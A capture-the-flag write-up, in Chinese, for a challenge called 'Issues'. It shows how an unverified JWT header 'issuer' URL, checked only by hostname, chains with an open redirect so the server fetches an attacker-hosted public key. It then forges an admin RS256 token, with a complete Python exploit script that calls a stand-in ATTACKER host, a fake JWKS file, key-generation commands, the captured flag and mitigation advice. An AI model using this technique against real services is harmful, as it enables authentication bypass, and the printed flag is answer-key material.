# Issues

## 题目简述

题目使用 JWT 保护 `/api/flag`。服务端坚持使用 RS256，但公钥地址由 JWT 头部中的自定义 `issuer` 字段决定；校验时只比较 URL 的 `netloc` 是否为 `localhost:8080`。站内 `/logout` 又存在任意跳转，二者组合后可让服务端从攻击者控制的位置下载公钥。

攻击者用自己的 RSA 私钥签发 `{"user":"admin"}`，再让服务端通过跳转取到配套公钥，即可伪造管理员令牌。

## 解题过程

认证函数先读取未验证的 JWT 头：

```python
header = jwt.get_unverified_header(token)
token_issuer = header["issuer"]

is_valid_issuer = (
    lambda issuer:
    urlparse(issuer).netloc == valid_issuer_domain
)
```

容器设置 `HOST=localhost:8080`，所以只要 `issuer` 的主机部分为 `localhost:8080` 就会通过。代码没有限制 scheme、path、query，也没有验证最终请求经过跳转后落到哪里。

公钥 URL 由字符串拼接产生：

```python
pubkey_url = token_issuer + "/.well-known/jwks.json"
resp = requests.get(pubkey_url)
```

而 `/logout` 会无条件跳转到查询参数：

```python
redirect_uri = request.args.get("redirect", url_for("home"))
return redirect(redirect_uri)
```

因此可把 JWT 头中的 `issuer` 设置为：

```text
http://localhost:8080/logout?redirect=http://ATTACKER/fake_jwks.json?
```

服务端追加固定后缀后，请求变成：

```text
http://localhost:8080/logout?redirect=http://ATTACKER/fake_jwks.json?/.well-known/jwks.json
```

`/logout` 返回 302，`requests` 默认跟随跳转，最终访问攻击者服务器的 `fake_jwks.json`；最后一段只成为查询字符串，不影响静态文件路径。

生成一对 RSA 密钥：

```bash
openssl genrsa -out private.pem 2048
openssl rsa -in private.pem -pubout -out public.pem
openssl rsa -in private.pem -pubout -outform DER |
    base64 -w0 > public.der.b64
```

应用没有按标准 `x5c` 语义解析证书链，而是直接取第一个字符串并套上 `PUBLIC KEY` PEM 头：

```python
key = resp["keys"][0]["x5c"][0]
pubkey = (
    "-----BEGIN PUBLIC KEY-----\n"
    + key
    + "\n-----END PUBLIC KEY-----"
).encode()
```

所以攻击者提供的 `fake_jwks.json` 应把 SubjectPublicKeyInfo DER 的 Base64 内容放入 `x5c[0]`：

```json
{
  "keys": [
    {
      "alg": "RS256",
      "x5c": ["PUBLIC_DER_BASE64"]
    }
  ]
}
```

在公网地址提供这个文件后，用对应私钥签发令牌。注意 `issuer` 位于 JWT header，而不是通常的 payload `iss` claim：

```python
import jwt
import requests

target = "http://issues.ctf.sekai.team"
attacker = "http://ATTACKER"
issuer = (
    "http://localhost:8080/logout"
    f"?redirect={attacker}/fake_jwks.json?"
)

with open("private.pem", "rb") as key_file:
    private_key = key_file.read()

token = jwt.encode(
    {"user": "admin"},
    private_key,
    algorithm="RS256",
    headers={
        "alg": "RS256",
        "issuer": issuer,
    },
)

response = requests.get(
    f"{target}/api/flag",
    headers={"Authorization": f"Bearer {token}"},
    timeout=10,
)
print(response.text)
```

服务端从攻击者地址取得公钥，RS256 验签成功，并接受 `user == "admin"`：

```text
SEKAI{v4l1d4t3_y0ur_i55u3r_plz}
```

## 方法总结

这不是 `alg=none` 或 RSA/HMAC 混淆，而是公钥来源验证失效。只校验初始 URL 的主机名还不够；如果路径中包含开放跳转，且 HTTP 客户端自动跟随重定向，最终公钥仍可来自任意主机。

安全实现应使用服务端固定的 JWKS 地址，或至少对最终响应 URL、scheme、端口和禁止重定向等条件做完整约束。JWT 自带的 header 和 claim 在验签前都不可信，不能让其中的 URL 决定验证该令牌所用的信任根。
